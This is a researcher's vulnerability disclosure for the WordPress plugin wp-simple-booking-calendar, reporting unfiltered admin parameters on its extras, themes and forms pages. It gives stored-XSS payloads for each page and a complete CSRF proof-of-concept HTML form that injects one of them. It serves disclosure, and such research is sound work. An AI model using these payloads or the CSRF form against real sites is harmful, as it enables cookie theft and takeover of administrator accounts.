Well ,sir ,I just found Stored-XSS bugs and a CSRF bug here.

The report link to the wordpress-form is missing, because the manager do not wish to put the public in danger ,I'll just write some details here.

#### Stored-XSS

##### Stored-XSS at extras

When the user click the "Extras" link，edit something and save changes， he'll post some data to:

```
http://localhost/wordpress/wp-admin/admin.php?page=wpdevart-extras
```


But when I pentest the  parameters, I found when I write something into this point, it does not filter well.

Weak data parameter:

```
extra_field1[items][field_item1][price_percent]=\"><img src=x onerror=console.log(/xss/)><\"
```

Here we got a low privilege role like a editor user：

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/wp-simple-booking-calendar/extra-xss1.png)

When the other users or the admin tried to edit the shared page, we'll get the users' cookie easily, or do something more evilly.

Here I login in the panel as the admin user, and visit the page with the stored-xss content.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/wp-simple-booking-calendar/extras-xss2.png)



##### Stored-XSS at themes

When the user click the "Themes" link，edit something and save changes， he'll post some data to:

```
http://localhost/wordpress/wp-admin/admin.php?page=wpdevart-themes
```


But when I pentest the  parameters, I found when I write something into this point, it does not filter well.

Weak data parameter:

```
sale_conditions[count][]='"><svg/onload=console.log(/xss2/)><'"
```

Here we got a low privilege role like a editor user：

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/wp-simple-booking-calendar/themes-xss1.png)

When the other users or the admin tried to edit the shared page, we'll get the users' cookie easily, or do something more evilly.

Here I login in the panel as the admin user, and visit the page with the stored-xss content.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/wp-simple-booking-calendar/themes-xss2.png)


##### Stored-XSS at forms

When the user click the "Forms" link，edit something and save changes， he'll post some data to:

```
http://localhost/wordpress/wp-admin/admin.php?page=wpdevart-forms
```


But when I pentest the  parameters, I found when I write something into this point, it does not filter well.

Weak data parameter:

```
form_field5[label]=Message'"><svg/onload=console.log(/xss3/)><'"
```

Here we got a low privilege role like a editor user：

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/wp-simple-booking-calendar/form-xss1.png)

When the other users or the admin tried to edit the shared page, we'll get the users' cookie easily, or do something more evilly.

Here I login in the panel as the admin user, and visit the page with the stored-xss content.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/wp-simple-booking-calendar/form-xss2.png)

#### CSRF

Well, the stored-xss here need to combined with a csrf bug. Because no csrf protection here, we can cheat the admin user to visit the evil html on the evil site.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wp-admin/admin.php?page=wpdevart-forms" method="POST">
      <input type="hidden" name="title" value="test123" />
      <input type="hidden" name="save" value="Save" />
      <input type="hidden" name="form&#95;field3&#91;type&#93;" value="text" />
      <input type="hidden" name="form&#95;field3&#91;name&#93;" value="form&#95;field3" />
      <input type="hidden" name="form&#95;field3&#91;label&#93;" value="Email" />
      <input type="hidden" name="form&#95;field3&#91;isemail&#93;" value="on" />
      <input type="hidden" name="form&#95;field4&#91;type&#93;" value="text" />
      <input type="hidden" name="form&#95;field4&#91;name&#93;" value="form&#95;field4" />
      <input type="hidden" name="form&#95;field4&#91;label&#93;" value="Phone" />
      <input type="hidden" name="form&#95;field5&#91;type&#93;" value="textarea" />
      <input type="hidden" name="form&#95;field5&#91;name&#93;" value="form&#95;field5" />
      <input type="hidden" name="form&#95;field5&#91;label&#93;" value="Message&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss3&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="task" value="save" />
      <input type="hidden" name="id" value="3" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

In a word, if the other user could be cheated to visit my evil html on my site, or I just a low privilege role to edit something in the shared page, I can get other users' cookie easily, or do something more evilly.


Well,  by the way, I just test the bug in the wordpress 4.9.1 and the latest version of the wp-plugin wp-simple-booking-calendar.
